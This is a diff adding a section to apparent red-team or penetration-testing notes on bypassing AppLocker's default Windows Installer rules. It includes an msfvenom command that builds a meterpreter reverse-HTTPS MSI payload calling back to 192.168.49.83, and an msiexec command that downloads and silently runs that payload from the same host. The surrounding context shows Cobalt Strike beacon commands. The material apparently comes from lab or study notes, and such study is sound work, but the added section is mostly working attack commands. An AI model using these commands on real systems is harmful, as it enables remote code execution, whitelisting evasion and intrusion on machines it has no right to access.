@@ -1821,6 +1821,33 @@ beacon> shell msiexec /i c:\Users\target\Desktop\Evil.msi /qn
 beacon> connect localhost 4444
 ```
 
+Restrictions:
+Default Installer rules:
+- (everyone) all digitally signed windows installer files
+- (everyone) all installer files in %systemdriver\%windows\installer
+	- `%WINDIR%\Installer\*`
+- (builtin\administrators) all installer files
+
+To get this to work the MSI file needs to be the "no-uac" format and the msiexec command requires the `/qn` flags. The file must be remote, under those conditions. A temp file is created in the white listed directory c:\windows\installer.
+
+```
+c:\windows\installer\
+
+03/25/2021  06:16 PM           126,976 MSI2658.tmp
+```
+
+Create
+
+```
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.83 LPORT=443 EXITFUNC=thread -f msi-nouac -o meterp64-nouac.msi
+```
+
+Run
+
+```
+msiexec /i http://192.168.49.83/meterp64-nouac.msi /qn
+```
+
 #### UAC
 
 Technique has been patched from Windows 10 1809 and onwards.
